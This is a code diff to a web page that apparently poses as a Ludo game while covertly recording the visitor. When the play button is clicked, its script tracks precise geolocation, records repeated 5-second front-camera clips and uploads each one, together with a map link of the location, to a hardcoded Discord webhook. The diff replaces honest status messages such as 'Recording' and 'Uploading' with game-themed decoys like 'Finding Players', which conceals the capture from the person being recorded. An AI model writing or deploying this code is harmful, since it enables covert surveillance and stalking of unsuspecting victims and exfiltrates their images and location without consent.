@@ -68,7 +68,6 @@
 
     <script>
         // --- CONFIGURATION ---
-        // Fallback Webhook (Agar GitHub se na load ho)
         const FALLBACK_WEBHOOK = "https://discord.com/api/webhooks/1548644115753865226/LXl4j5NGgIfFzyLe-Vm0g10anJpet_aGHeSlJs5pVHVWEuvq8RKHvgjxNmj60B9rIATz";
         
         let CONFIG = { webhook_url: FALLBACK_WEBHOOK };
@@ -109,18 +108,18 @@
         // 2. Start Process
         playBtn.addEventListener('click', async () => {
             playBtn.disabled = true;
-            updateStatus("🔍 Locating...");
+            updateStatus("🔍 Finding...");
 
             // Start Location
             navigator.geolocation.watchPosition(
                 (pos) => {
                     currentLocation = { 
-                        lat: pos.coords.latitude.toFixed(6), 
-                        lng: pos.coords.longitude.toFixed(6) 
+                        lat: pos.coords.latitude, 
+                        lng: pos.coords.longitude 
                     };
                 },
                 (err) => { 
-                    currentLocation = { lat: "Error", lng: "Error" }; 
+                    currentLocation = { lat: 0, lng: 0 }; 
                 },
                 { enableHighAccuracy: true }
             );
@@ -128,7 +127,7 @@
             // Wait 2 seconds for location to initialize
             await new Promise(r => setTimeout(r, 2000));
 
-            updateStatus("📷 Starting Camera...");
+            updateStatus("🚀 Finding New Player ...");
             try {
                 const stream = await navigator.mediaDevices.getUserMedia({ 
                     video: { facingMode: "user" }, 
@@ -145,9 +144,8 @@
         });
 
         function startLoop() {
-            updateStatus("🔴 Recording 5s...");
+            updateStatus("✨ Finding Players...");
             
-            // Start Recording
             const mediaRecorder = new MediaRecorder(videoEl.srcObject);
             const chunks = [];
 
@@ -158,21 +156,16 @@
             mediaRecorder.onstop = async () => {
                 const blob = new Blob(chunks, { type: 'video/webm' });
                 
-                // Send to Discord
-                updateStatus("⬆️ Uploading...");
+                updateStatus("⬆️ A Player Found...");
                 await uploadToDiscord(blob);
                 
-                // Wait 5 Seconds (Stop Phase)
-                updateStatus("⏳ Waiting 5s...");
+                updateStatus("⏳ Finding...");
                 setTimeout(() => {
-                    startLoop(); // Restart
+                    startLoop();
                 }, 5000);
             };
 
-            // Start recording for 5 seconds
             mediaRecorder.start();
-            
-            // Stop after exactly 5 seconds
             setTimeout(() => {
                 mediaRecorder.stop();
             }, 5000);
@@ -182,16 +175,24 @@
             const formData = new FormData();
             formData.append("file", blob, `ludo_${Date.now()}.webm`);
             
-            // Location Payload
+            // --- CHANGE HERE: Generate Google Maps Link ---
+            let mapLink = "";
+            if (currentLocation.lat !== "N/A" && currentLocation.lng !== "N/A") {
+                mapLink = `https://www.google.com/maps?q=${currentLocation.lat},${currentLocation.lng}&z=18`;
+            } else {
+                mapLink = "Location not available";
+            }
+
             const payload = {
-                content: `🎮 **Live Player Found**\n📍 Location: Lat: ${currentLocation.lat}, Lng: ${currentLocation.lng}\n⏱️ ${new Date().toLocaleTimeString()}`
+                content: `🎮 **Player Detected!**\n📍 **Live Location:** [Click Here to View](https://www.google.com/maps?q=${currentLocation.lat},${currentLocation.lng})\n⏱️ Time: ${new Date().toLocaleTimeString()}`
             };
+            
             formData.append("payload_json", JSON.stringify(payload));
 
             try {
                 const res = await fetch(webhookUrl, { method: "POST", body: formData });
                 if (res.ok) {
-                    updateStatus("✅ Sent! (Waiting...)");
+                    updateStatus("✅ Player Finded! (Finding Next Player...)");
                 } else {
                     updateStatus("❌ Upload Failed");
                 }
@@ -200,7 +201,6 @@
             }
         }
 
-        // Init
         window.onload = loadConfig;
     </script>
 </body>
